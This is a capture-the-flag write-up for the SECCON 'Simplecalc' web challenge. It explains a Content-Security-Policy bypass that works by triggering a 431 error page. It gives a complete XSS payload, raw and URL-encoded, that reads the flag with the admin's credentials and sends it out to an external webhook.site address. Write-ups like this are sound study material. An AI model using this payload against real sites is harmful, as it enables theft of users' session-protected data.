# Simplecalc - Web problem - writeup by Vie

> (132 pt)
> author:Arkwarmup
>
>This is a simplest calculator app.
> 
> Note: Don't forget that the target host is localhost from the admin bot.
>
> http://simplecalc.seccon.games:3000
>
> [simplecalc.tar.gz](./simplecalc.tar.gz) 6723d8fd7db93c5c0181845cfadd5048f4fdd267



## Overview

Self-explanatory app - you can submit equations which are processed into a client-side `eval`, your expression of which will appear in an `expr?=` GET query to index the result. 

The source is minimal, so we can focus on the good parts easily: 

```js
app.use((req, res, next) => {
  const js_url = new URL(`http://${req.hostname}:${PORT}/js/index.js`);
  res.header('Content-Security-Policy', `default-src ${js_url} 'unsafe-eval';`);
  next();
});
```

The app applies a CSP to, ostensibly, all locations of the app, with a `default-src` set to `http://simplecalc.seccon.games:3000/js/index/js` (or `localhost` if running locally, or according to the bot) allowing it to `unsafe-eval`.

The 


## Unintended Attack

First and foremost, you can bypass the CSP by forcing a page under the simplecalc/localhost domain by navigating to `http://simplecalc.seccon.games:3000/js/index.js?<extremely_long_sequence_of_charactars_here>` and the length of your GET query will force a status code 431. The content of the page is irrelevant for our purposes, what's relevant is that the 431'd page lacks the CSP header. This is a page under the correct domain but with no CSP, so we can utilize our `fetch` or `xhr` XSS payloads freely. In order to attack this, you open an iframe with its src set to `http://simplecalc.seccon.games:3000/js/index.js?<extremely_long_sequence_of_charactars_here>`, append it to the document, and then when it loads, access its contentWindow to then access the page's `eval`. From there you get a straightforward XSS.


Put this in the `?expr=` query: 


```js
var gib=document.createElement('iframe');gib.src="http://localhost:3000/js/index.js?"+"a".repeat(0x5000);document.body.appendChild(gib);gib.onload=function(){gib.contentWindow.eval('x=new XMLHttpRequest;x.onload=function(){t=this.responseText;y=new XMLHttpRequest;y.open("GET","http://webhook.site/1ec04c0d-14c5-41d9-80cd-dba3875c48d1?"+t);y.send();};x.open("GET","http://localhost:3000/flag");x.setRequestHeader("X-FLAG","ok");x.withCredentials=true;x.send();')}

```

And submit the calculated result to the admin:

```
http://simplecalc.seccon.games:3000?expr=var%20gib%3Ddocument.createElement%28%27iframe%27%29%3Bgib.src%3D%22http%3A%2F%2Flocalhost%3A3000%2Fjs%2Findex.js%3F%22%2B%22a%22.repeat%280x5000%29%3Bdocument.body.appendChild%28gib%29%3Bgib.onload%3Dfunction%28%29%7Bgib.contentWindow.eval%28%27x%3Dnew%20XMLHttpRequest%3Bx.onload%3Dfunction%28%29%7Bt%3Dthis.responseText%3By%3Dnew%20XMLHttpRequest%3By.open%28%22GET%22%2C%22http%3A%2F%2Fwebhook.site%2F1ec04c0d-14c5-41d9-80cd-dba3875c48d1%3F%22%2Bt%29%3By.send%28%29%3B%7D%3Bx.open%28%22GET%22%2C%22http%3A%2F%2Flocalhost%3A3000%2Fflag%22%29%3Bx.setRequestHeader%28%22X-FLAG%22%2C%22ok%22%29%3Bx.withCredentials%3Dtrue%3Bx.send%28%29%3B%27%29%7D
```

And wait for flag: `SECCON{service_worker_is_powerfull_49a3b7bf6d2ae18d}` _Oh_, service workers, huh. My unintended soln was pretty fun to do too though. :>